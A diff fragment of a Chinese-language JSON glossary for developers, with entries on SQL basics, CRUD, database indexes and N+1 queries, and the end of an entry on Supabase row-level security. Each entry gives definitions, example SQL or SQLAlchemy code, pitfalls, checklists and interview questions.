+    "a": "业务逻辑复杂、需要大量服务端事务编排，数据规模或查询模式超出平台能力，有严格的数据驻留或合规要求，或对成本的可预测性要求很高时。也可以组合：数据和认证用 BaaS，复杂逻辑放自有服务。"
+   },
+   {
+    "q": "RLS 策略如何测试？",
+    "a": "在测试环境创建多个用户，分别用其令牌通过客户端 SDK 执行读写，断言只能访问自己的数据、不能写入他人数据；同时测试匿名访问。Supabase 也支持在 SQL 中模拟角色和 JWT 声明执行查询，可以写成数据库测试纳入 CI。"
+   }
+  ],
+  "refs": [
+   {
+    "title": "Supabase Docs: Row Level Security",
+    "url": "https://supabase.com/docs/guides/database/postgres/row-level-security"
+   },
+   {
+    "title": "Supabase Docs: API keys",
+    "url": "https://supabase.com/docs/guides/api/api-keys"
+   },
+   {
+    "title": "Firebase Docs: Security Rules",
+    "url": "https://firebase.google.com/docs/rules"
+   }
+  ]
+ },
+ {
+  "slug": "sql-basics",
+  "def": "SQL（Structured Query Language，结构化查询语言）是操作关系型数据库的声明式语言，由 ISO/IEC 9075 标准化。开发者描述“要什么数据”，优化器决定“怎么取”。它分为 DDL、DML、DCL 和事务控制，PostgreSQL、MySQL、SQLite 均实现标准核心并各有方言。",
+  "how": [
+   "DDL 用 CREATE TABLE 等定义表结构、数据类型、主键、外键和约束。",
+   "DML 用 SELECT、INSERT、UPDATE、DELETE 读写数据，JOIN 根据关联列组合多张表。",
+   "SELECT 的逻辑执行顺序为 FROM/JOIN、WHERE、GROUP BY、HAVING、SELECT、ORDER BY、LIMIT。",
+   "数据库解析 SQL，优化器基于统计信息和索引生成执行计划，可用 EXPLAIN 查看。",
+   "事务用 BEGIN、COMMIT、ROLLBACK 把多条语句组成原子单元，保证 ACID 特性。"
+  ],
+  "terms": [
+   {
+    "t": "JOIN",
+    "d": "按关联条件组合多表行，常见 INNER、LEFT 连接。"
+   },
+   {
+    "t": "GROUP BY / 聚合函数",
+    "d": "按列分组后用 COUNT、SUM、AVG 等计算汇总。"
+   },
+   {
+    "t": "NULL",
+    "d": "表示未知或缺失，比较需用 IS NULL，参与运算结果通常为 NULL。"
+   },
+   {
+    "t": "事务 (Transaction)",
+    "d": "一组要么全部成功、要么全部回滚的操作。"
+   },
+   {
+    "t": "执行计划 (Query Plan)",
+    "d": "数据库实际执行查询的步骤，用 EXPLAIN 查看。"
+   }
+  ],
+  "code": {
+   "lang": "sql",
+   "title": "建表、关联与聚合",
+   "src": "CREATE TABLE users (\n  id    INTEGER PRIMARY KEY,\n  name  TEXT NOT NULL\n);\nCREATE TABLE orders (\n  id      INTEGER PRIMARY KEY,\n  user_id INTEGER NOT NULL REFERENCES users(id),\n  amount  NUMERIC NOT NULL,\n  status  TEXT NOT NULL DEFAULT 'paid'\n);\n\nINSERT INTO users (id, name) VALUES (1, 'Ada'), (2, 'Lin'), (3, 'Mo');\nINSERT INTO orders (user_id, amount) VALUES (1, 30), (1, 70), (2, 15);\n\n-- 每个用户的订单数与总额，包括没有订单的用户\nSELECT u.name,\n       COUNT(o.id)              AS order_count,\n       COALESCE(SUM(o.amount), 0) AS total\nFROM users u\nLEFT JOIN orders o ON o.user_id = u.id AND o.status = 'paid'\nGROUP BY u.id, u.name\nHAVING COUNT(o.id) < 3\nORDER BY total DESC;",
+   "note": "LEFT JOIN 保留无订单用户；条件写在 ON 而非 WHERE，否则会把无订单的行过滤掉。"
+  },
+  "table": {
+   "title": "SQL 语言分类",
+   "head": [
+    "类别",
+    "关键字",
+    "作用"
+   ],
+   "rows": [
+    [
+     "DDL",
+     "CREATE、ALTER、DROP",
+     "定义和修改结构"
+    ],
+    [
+     "DML",
+     "SELECT、INSERT、UPDATE、DELETE",
+     "查询和修改数据"
+    ],
+    [
+     "DCL",
+     "GRANT、REVOKE",
+     "权限控制"
+    ],
+    [
+     "事务控制",
+     "BEGIN、COMMIT、ROLLBACK",
+     "保证原子性"
+    ]
+   ]
+  },
+  "tradeoffs": [
+   {
+    "opt": "手写 SQL",
+    "pros": "表达力强，性能可控",
+    "cons": "需防注入，维护成本高",
+    "when": "复杂查询、报表"
+   },
+   {
+    "opt": "ORM",
+    "pros": "开发快，类型友好",
+    "cons": "易产生低效查询",
+    "when": "常规 CRUD"
+   },
+   {
+    "opt": "查询构建器",
+    "pros": "可组合且接近 SQL",
+    "cons": "多一层抽象",
+    "when": "动态条件较多"
+   }
+  ],
+  "pitfalls": [
+   {
+    "bad": "用 = NULL 判断空值",
+    "fix": "使用 IS NULL / IS NOT NULL"
+   },
+   {
+    "bad": "LEFT JOIN 后在 WHERE 中过滤右表列",
+    "fix": "右表条件放到 ON 子句，否则退化为内连接"
+   },
+   {
+    "bad": "SELECT * 用于生产查询",
+    "fix": "只选需要的列，减少 I/O 并避免结构变化影响"
+   },
+   {
+    "bad": "UPDATE/DELETE 忘写 WHERE",
+    "fix": "先用 SELECT 验证条件，在事务中执行"
+   }
+  ],
+  "checklist": [
+   "表有主键和必要约束",
+   "外键关系明确",
+   "查询使用参数绑定",
+   "批量修改在事务中执行",
+   "慢查询用 EXPLAIN 分析",
+   "AI 生成的 SQL 先在测试库验证"
+  ],
+  "interview": [
+   {
+    "q": "WHERE 和 HAVING 的区别？",
+    "a": "WHERE 在分组前过滤行，不能使用聚合函数；HAVING 在 GROUP BY 之后过滤分组，可以使用聚合结果，例如 HAVING COUNT(*) > 5。能在 WHERE 中完成的过滤应尽量放在 WHERE，以减少参与分组的数据量。"
+   },
+   {
+    "q": "INNER JOIN 和 LEFT JOIN 有何不同？",
+    "a": "INNER JOIN 只返回两表都匹配的行；LEFT JOIN 返回左表所有行，右表无匹配时以 NULL 填充。常用于“包括没有订单的用户”这类需求。注意右表过滤条件位置，放在 WHERE 中会让 LEFT JOIN 退化为 INNER JOIN。"
+   },
+   {
+    "q": "为什么说 SQL 是声明式的？",
+    "a": "SQL 只描述想要的结果集，而不指定使用哪个索引、以什么顺序连接表。这些由优化器根据统计信息选择。好处是同一查询可随数据变化自动选择更优计划，代价是需要用 EXPLAIN 理解并引导实际执行方式。"
+   }
+  ],
+  "refs": [
+   {
+    "title": "PostgreSQL Tutorial: The SQL Language",
+    "url": "https://www.postgresql.org/docs/current/tutorial-sql.html"
+   },
+   {
+    "title": "SQLite: SQL As Understood By SQLite",
+    "url": "https://www.sqlite.org/lang.html"
+   },
+   {
+    "title": "Wikipedia: SQL",
+    "url": "https://en.wikipedia.org/wiki/SQL"
+   }
+  ]
+ },
+ {
+  "slug": "crud",
+  "def": "CRUD 是 Create、Read、Update、Delete 四种基本数据操作的缩写，分别对应 SQL 的 INSERT、SELECT、UPDATE、DELETE，以及 REST 的 POST、GET、PUT/PATCH、DELETE，是业务系统的数据骨架。专业实现还要处理校验、授权、并发、分页、软删除和审计。",
+  "how": [
+   "Create：校验输入，生成主键，写入数据库，返回 201 和新资源或其地址。",
+   "Read：按 ID 读取单个资源，或按条件、分页、排序读取列表，并做对象级授权。",
+   "Update：PUT 整体替换、PATCH 部分更新，用字段白名单和版本号防止越权与并发覆盖。",
+   "Delete：硬删除直接移除数据；软删除标记 deleted_at，便于恢复和审计。",
+   "每个操作都经过认证、授权、校验三层，并记录关键变更的审计日志。"
+  ],
+  "terms": [
+   {
+    "t": "幂等性 (Idempotency)",
+    "d": "PUT、DELETE 多次执行结果相同，POST 通常不是。"
+   },
+   {
+    "t": "乐观锁 (Optimistic Locking)",
+    "d": "用版本号或 ETag 检测并发修改，冲突时拒绝更新。"
+   },
+   {
+    "t": "软删除 (Soft Delete)",
+    "d": "用标记字段表示删除而不真正移除数据。"
+   },
+   {
+    "t": "游标分页 (Cursor Pagination)",
+    "d": "用上一页最后一条的排序键取下一页，适合大数据量。"
+   },
+   {
+    "t": "Upsert",
+    "d": "存在则更新、不存在则插入，如 PostgreSQL 的 ON CONFLICT。"
+   }
+  ],
+  "code": {
+   "lang": "sql",
+   "title": "CRUD 的专业写法",
+   "src": "-- Create：返回生成的记录（PostgreSQL / SQLite 3.35+ 支持 RETURNING）\nINSERT INTO notes (owner_id, title, body, version)\nVALUES ($1, $2, $3, 1)\nRETURNING id, created_at;\n\n-- Read：游标分页 + 归属过滤 + 排除软删除\nSELECT id, title, created_at FROM notes\nWHERE owner_id = $1 AND deleted_at IS NULL AND id < $2\nORDER BY id DESC\nLIMIT 20;\n\n-- Update：乐观锁，版本不匹配则影响 0 行，应返回 409/412\nUPDATE notes SET title = $3, version = version + 1, updated_at = now()\nWHERE id = $1 AND owner_id = $2 AND version = $4;\n\n-- Delete：软删除\nUPDATE notes SET deleted_at = now()\nWHERE id = $1 AND owner_id = $2 AND deleted_at IS NULL;\n\n-- Upsert：存在则更新\nINSERT INTO settings (user_id, theme) VALUES ($1, $2)\nON CONFLICT (user_id) DO UPDATE SET theme = EXCLUDED.theme;",
+   "note": "PostgreSQL 语法；每条语句都带 owner_id 授权条件，更新带版本号防覆盖。"
+  },
+  "table": {
+   "title": "CRUD 映射关系",
+   "head": [
+    "操作",
+    "SQL",
+    "HTTP",
+    "成功状态码"
+   ],
+   "rows": [
+    [
+     "Create",
+     "INSERT",
+     "POST /notes",
+     "201"
+    ],
+    [
+     "Read",
+     "SELECT",
+     "GET /notes/:id",
+     "200"
+    ],
+    [
+     "Update",
+     "UPDATE",
+     "PUT/PATCH /notes/:id",
+     "200 或 204"
+    ],
+    [
+     "Delete",
+     "DELETE 或软删除",
+     "DELETE /notes/:id",
+     "204"
+    ]
+   ]
+  },
+  "tradeoffs": [
+   {
+    "opt": "硬删除",
+    "pros": "数据干净，符合删除权要求",
+    "cons": "无法恢复",
+    "when": "用户要求删除个人数据"
+   },
+   {
+    "opt": "软删除",
+    "pros": "可恢复、可审计",
+    "cons": "每个查询都要过滤，唯一约束更复杂",
+    "when": "业务数据、误删风险高"
+   },
+   {
+    "opt": "偏移分页 OFFSET",
+    "pros": "实现简单，可跳页",
+    "cons": "深分页慢，数据变动时重复或遗漏",
+    "when": "小数据量后台列表"
+   }
+  ],
+  "pitfalls": [
+   {
+    "bad": "Read/Update/Delete 只按 ID 操作不查归属",
+    "fix": "所有语句带 owner_id 或租户条件"
+   },
+   {
+    "bad": "后写覆盖先写，丢失他人修改",
+    "fix": "使用版本号或 ETag 实现乐观锁"
+   },
+   {
+    "bad": "列表接口不分页，一次返回全表",
+    "fix": "强制分页并限制最大页大小"
+   },
+   {
+    "bad": "软删除后唯一约束导致无法重建同名记录",
+    "fix": "使用部分唯一索引，排除已删除行"
+   }
+  ],
+  "checklist": [
+   "每个操作有输入校验",
+   "每个操作有对象级授权",
+   "列表接口强制分页",
+   "更新有并发控制",
+   "删除策略明确（软/硬）",
+   "关键变更写审计日志"
+  ],
+  "interview": [
+   {
+    "q": "PUT 和 PATCH 的区别？",
+    "a": "PUT 用请求体完整替换资源，缺失字段会被置空或默认值，语义上是幂等的；PATCH 只修改提供的字段，适合部分更新，不保证幂等。实践中 PATCH 更常用，但要配合字段白名单，防止客户端修改不允许的字段。"
+   },
+   {
+    "q": "如何处理并发更新冲突？",
+    "a": "乐观锁：读取时拿到版本号或 ETag，更新时带上，WHERE 条件匹配版本才更新，影响行数为 0 说明已被他人修改，返回 409 或 412 让客户端重新获取。高冲突场景可用悲观锁 SELECT ... FOR UPDATE，但会降低并发。"
+   },
+   {
+    "q": "为什么大数据量推荐游标分页？",
+    "a": "OFFSET 分页需要扫描并丢弃前面所有行，页码越深越慢；数据插入或删除时还会出现重复或遗漏。游标分页用上一页最后一条的排序键作为起点，配合索引可直接定位，性能稳定，结果也更一致，代价是不能随意跳页。"
+   }
+  ],
+  "refs": [
+   {
+    "title": "Wikipedia: Create, read, update and delete",
+    "url": "https://en.wikipedia.org/wiki/Create,_read,_update_and_delete"
+   },
+   {
+    "title": "PostgreSQL Docs: INSERT (ON CONFLICT)",
+    "url": "https://www.postgresql.org/docs/current/sql-insert.html"
+   },
+   {
+    "title": "MDN: HTTP request methods",
+    "url": "https://developer.mozilla.org/en-US/docs/Web/HTTP/Methods"
+   }
+  ]
+ },
+ {
+  "slug": "indexes",
+  "def": "数据库索引（Index）是为加速按特定列查找而额外维护的数据结构，最常见的是 B-tree（B 树），此外还有哈希、GIN、GiST 等类型。它属于数据库存储与查询优化层，以额外的存储空间和写入开销，换取查询从全表扫描变为对数级查找，是解决慢查询最常用的手段。",
+  "how": [
+   "创建索引时，数据库按索引列的值排序构建 B-tree，叶子节点保存键值与行位置。",
+   "查询时优化器根据统计信息评估成本，选择索引扫描、仅索引扫描或全表扫描。",
+   "复合索引按列顺序排序，遵循最左前缀原则：(a, b) 可服务 a 或 a+b 条件，难以单独服务 b。",
+   "每次 INSERT、UPDATE、DELETE 都需同步维护所有相关索引，索引越多写入越慢。",
+   "通过 EXPLAIN ANALYZE 查看实际执行计划和耗时，验证索引是否被使用。"
+  ],
+  "terms": [
+   {
+    "t": "B-tree",
+    "d": "平衡多路搜索树，支持等值、范围查询和排序，默认索引类型。"
+   },
+   {
+    "t": "复合索引 (Composite Index)",
+    "d": "包含多列的索引，列顺序决定能服务的查询。"
+   },
+   {
+    "t": "覆盖索引 (Covering Index)",
+    "d": "索引包含查询所需全部列，无需回表读取。"
+   },
+   {
+    "t": "选择性 (Selectivity)",
+    "d": "列中不同值的比例，选择性越高索引越有效。"
+   },
+   {
+    "t": "全表扫描 (Seq Scan)",
+    "d": "逐行读取整张表，数据大时很慢。"
+   }
+  ],
+  "code": {
+   "lang": "sql",
+   "title": "用 EXPLAIN 验证索引",
+   "src": "-- 慢查询：按用户查最近订单\nEXPLAIN ANALYZE\nSELECT id, amount, created_at FROM orders\nWHERE user_id = 42\nORDER BY created_at DESC\nLIMIT 20;\n-- 无索引时计划通常为 Seq Scan + Sort\n\n-- 复合索引：等值列在前，排序列在后\nCREATE INDEX CONCURRENTLY idx_orders_user_created\n  ON orders (user_id, created_at DESC);\n\n-- 再次 EXPLAIN ANALYZE，计划应变为 Index Scan，且无需单独排序\n\n-- 部分索引：只索引未完成订单，体积更小\nCREATE INDEX idx_orders_pending ON orders (created_at)\n  WHERE status = 'pending';\n\n-- 查看未被使用的索引（PostgreSQL 统计视图）\nSELECT indexrelname, idx_scan FROM pg_stat_user_indexes ORDER BY idx_scan;",
+   "note": "PostgreSQL 语法；CONCURRENTLY 建索引不阻塞写入，但不能在事务块内执行。"
+  },
+  "table": {
+   "title": "PG 常用索引类型",
+   "head": [
+    "类型",
+    "适用查询",
+    "示例"
+   ],
+   "rows": [
+    [
+     "B-tree",
+     "等值、范围、排序",
+     "WHERE created_at > ..."
+    ],
+    [
+     "Hash",
+     "仅等值",
+     "WHERE token = ..."
+    ],
+    [
+     "GIN",
+     "数组、JSONB、全文检索",
+     "WHERE tags @> '{ai}'"
+    ],
+    [
+     "GiST/BRIN",
+     "地理空间 / 超大有序表",
+     "范围查询、时序数据"
+    ]
+   ]
+  },
+  "tradeoffs": [
+   {
+    "opt": "为高频查询建精准复合索引",
+    "pros": "查询快，可覆盖排序",
+    "cons": "写入变慢、占空间",
+    "when": "读多写少的热点查询"
+   },
+   {
+    "opt": "少建索引",
+    "pros": "写入快",
+    "cons": "查询可能全表扫描",
+    "when": "写入密集的日志类表"
+   },
+   {
+    "opt": "部分索引/表达式索引",
+    "pros": "体积小、针对性强",
+    "cons": "查询条件必须匹配",
+    "when": "只查询特定子集"
+   }
+  ],
+  "pitfalls": [
+   {
+    "bad": "给每一列都建单列索引",
+    "fix": "按实际查询模式建复合索引，删除无用索引"
+   },
+   {
+    "bad": "在索引列上套函数，如 WHERE lower(email)=...",
+    "fix": "建立表达式索引或存储规范化后的值"
+   },
+   {
+    "bad": "复合索引列顺序随意",
+    "fix": "等值条件列在前，范围和排序列在后"
+   },
+   {
+    "bad": "生产大表直接 CREATE INDEX 锁表",
+    "fix": "PostgreSQL 使用 CREATE INDEX CONCURRENTLY"
+   }
+  ],
+  "checklist": [
+   "外键列与高频过滤列已建索引",
+   "慢查询用 EXPLAIN ANALYZE 验证",
+   "复合索引顺序符合查询",
+   "定期清理未使用索引",
+   "大表在线建索引不锁写",
+   "AI 建议的索引先在生产规模数据上验证"
+  ],
+  "interview": [
+   {
+    "q": "为什么建了索引查询还是不走？",
+    "a": "可能原因：条件选择性低，优化器认为全表扫描更便宜；在索引列上用了函数或隐式类型转换；复合索引没有满足最左前缀；使用前导通配符 LIKE '%x'；统计信息过时。应通过 EXPLAIN 和更新统计信息逐一排查。"
+   },
+   {
+    "q": "复合索引的最左前缀原则是什么？",
+    "a": "复合索引按第一列排序，第一列相同再按第二列排序。因此 (a, b, c) 能高效服务 a、a+b、a+b+c 的条件，而单独查 b 或 c 时，B-tree 无法利用顺序定位。设计时通常把等值过滤列放前面，范围或排序列放后面。"
+   },
+   {
+    "q": "索引是不是越多越好？",
+    "a": "不是。每个索引都占用存储，并在每次写入时需要维护，降低 INSERT、UPDATE 性能；过多索引也会增加优化器的选择负担。应根据真实查询模式建立少量精准的索引，并定期清理从未被使用的索引。"
+   }
+  ],
+  "refs": [
+   {
+    "title": "PostgreSQL Docs: Indexes",
+    "url": "https://www.postgresql.org/docs/current/indexes.html"
+   },
+   {
+    "title": "PostgreSQL Docs: Using EXPLAIN",
+    "url": "https://www.postgresql.org/docs/current/using-explain.html"
+   },
+   {
+    "title": "Use The Index, Luke",
+    "url": "https://use-the-index-luke.com/"
+   }
+  ]
+ },
+ {
+  "slug": "n-plus-1-queries",
+  "def": "N+1 查询问题（N+1 Queries）是先用 1 次查询取出 N 条主记录，再在循环中为每条记录各发 1 次查询获取关联数据，共执行 N+1 次查询的性能反模式。它常由 ORM 的懒加载（Lazy Loading）隐式触发，代码看起来简洁，数据量增长后网络往返和延迟急剧上升，是 AI 生成代码中的常见性能问题。",
+  "how": [
+   "代码先用一次查询取出一组主记录，例如最近发布的 20 篇文章。",
+   "遍历时访问每条记录的关联属性，如 post.author，ORM 懒加载为每次访问发出一条 SELECT。",
+   "总查询数随 N 线性增长，每次查询都有网络往返和解析开销，即使单条很快总耗时也很高。",
+   "解决方法是预先批量加载关联数据：JOIN 一次取回，或用 WHERE id IN (...) 第二次批量查询。",
+   "GraphQL 等嵌套解析场景常用 DataLoader 把同一轮请求中的单条查询合并为批量查询。"
+  ],
+  "terms": [
+   {
+    "t": "懒加载 (Lazy Loading)",
+    "d": "访问关联属性时才发起查询，是 N+1 的常见来源。"
+   },
+   {
+    "t": "预加载 (Eager Loading)",
+    "d": "查询主记录时一并加载关联数据。"
+   },
+   {
+    "t": "selectinload",
+    "d": "SQLAlchemy 用一次 IN 查询批量加载关联集合的策略。"
+   },
+   {
+    "t": "joinedload",
+    "d": "SQLAlchemy 用 JOIN 在同一查询中加载关联的策略。"
+   },
+   {
+    "t": "DataLoader",
+    "d": "把同一事件循环内的多次按键加载合并成一次批量请求的工具。"
+   }
+  ],
+  "code": {
+   "lang": "python",
+   "title": "SQLAlchemy 修复 N+1",
+   "src": "from sqlalchemy import ForeignKey, create_engine, select\nfrom sqlalchemy.orm import (DeclarativeBase, Mapped, Session,\n                            mapped_column, relationship, selectinload)\n\nclass Base(DeclarativeBase): pass\n\nclass User(Base):\n    __tablename__ = \"users\"\n    id: Mapped[int] = mapped_column(primary_key=True)\n    posts: Mapped[list[\"Post\"]] = relationship(back_populates=\"author\")\n\nclass Post(Base):\n    __tablename__ = \"posts\"\n    id: Mapped[int] = mapped_column(primary_key=True)\n    author_id: Mapped[int] = mapped_column(ForeignKey(\"users.id\"))\n    author: Mapped[User] = relationship(back_populates=\"posts\")\n\nengine = create_engine(\"sqlite://\", echo=True)   # echo 打印每条 SQL\nBase.metadata.create_all(engine)\n\nwith Session(engine) as s:\n    # N+1：每个 user.posts 都会触发一次懒加载查询\n    for u in s.scalars(select(User)):\n        len(u.posts)\n    # 修复：一次查用户 + 一次 IN 查询批量加载所有帖子\n    for u in s.scalars(select(User).options(selectinload(User.posts))):\n        len(u.posts)",
+   "note": "开启 echo 可直观看到查询次数变化；一对多集合常用 selectinload，多对一可用 joinedload。"
+  },
+  "table": {
+   "title": "常见框架的预加载写法",
+   "head": [
+    "框架",
+    "N+1 写法",
+    "修复写法"
+   ],
+   "rows": [
+    [
+     "SQLAlchemy",
+     "循环访问 user.posts",
+     "options(selectinload(User.posts))"
+    ],
+    [
+     "Django ORM",
+     "循环访问 post.author",
+     "select_related / prefetch_related"
+    ],
+    [
+     "Prisma",
+     "循环中 findMany 关联",
+     "include: { posts: true }"
+    ],
+    [
+     "Rails ActiveRecord",
+     "循环访问 post.author",
+     "includes(:author)"
+    ]
+   ]
+  },
+  "tradeoffs": [
+   {
+    "opt": "JOIN 预加载",
+    "pros": "一次往返",
+    "cons": "一对多会产生重复行，结果集膨胀",
+    "when": "多对一、一对一关联"
+   },
+   {
+    "opt": "IN 批量查询",
+    "pros": "无重复行，结构清晰",
+    "cons": "两次往返，IN 列表过大需分批",
+    "when": "一对多集合"
+   },
+   {
+    "opt": "DataLoader 批处理",
+    "pros": "适配嵌套解析，自动合并",
+    "cons": "引入额外抽象",
+    "when": "GraphQL、按需组合的接口"
+   }
+  ],
+  "pitfalls": [
+   {
+    "bad": "开发环境数据少，N+1 不易察觉",
+    "fix": "开启 SQL 日志，或在测试中断言查询次数"
+   },
+   {
+    "bad": "为解决 N+1 预加载了所有关联",
+    "fix": "只加载当前接口需要的关联，避免过度获取"
+   },
+   {
+    "bad": "在模板或序列化器中隐式访问关联",
+    "fix": "在查询层统一声明预加载，或开启懒加载报错模式"
+   },
+   {
+    "bad": "AI 生成的列表接口在循环里调用数据库",
+    "fix": "审查循环内的 I/O，要求改为批量查询"
+   }
+  ],
+  "checklist": [
+   "列表接口审查循环内查询",
+   "开发环境开启 SQL 日志",
+   "关键接口测试断言查询次数",
+   "按需选择预加载策略",
+   "APM 监控每请求查询数",
+   "GraphQL 解析器使用批处理"
+  ],
+  "interview": [
+   {
+    "q": "为什么单条查询很快，N+1 仍然慢？",
+    "a": "每次查询都有固定开销：网络往返、连接调度、SQL 解析和计划。单条 1 毫秒，1000 条就是 1 秒以上，而一次批量查询可能只要几毫秒。数据库在跨机器部署时往返延迟更大，问题会更加明显。"
+   },
+   {
+    "q": "如何在项目中及早发现 N+1？",
+    "a": "开发时开启 ORM 的 SQL 日志；使用专门的检测工具，如 Rails 的 Bullet、Django 的 nplusone 等；在集成测试中断言某个接口的查询次数上限；生产环境用 APM 查看每请求的查询数量和重复语句。"
+   },
+   {
+    "q": "JOIN 预加载和 IN 预加载如何选择？",
+    "a": "多对一（文章取作者）用 JOIN，结果行数不变；一对多（用户取所有文章）用 JOIN 会让主记录重复、数据量膨胀，用第二次 IN 查询更高效。也要注意 IN 列表过长时需分批，具体以 EXPLAIN 和实际耗时为准。"
+   }
+  ],
+  "refs": [
+   {
+    "title": "SQLAlchemy Docs: Relationship Loading Techniques",
+    "url": "https://docs.sqlalchemy.org/en/20/orm/queryguide/relationships.html"
+   },
+   {
+    "title": "Django Docs: select_related / prefetch_related",
+    "url": "https://docs.djangoproject.com/en/stable/ref/models/querysets/#select-related"
+   },
+   {
+    "title": "Prisma Docs: Query optimization",
+    "url": "https://www.prisma.io/docs/orm/prisma-client/queries/query-optimization-performance"
+   },
+   {
+    "title": "DataLoader (GitHub)",
+    "url": "https://github.com/graphql/dataloader"
+   }
+  ]
+ }
+]
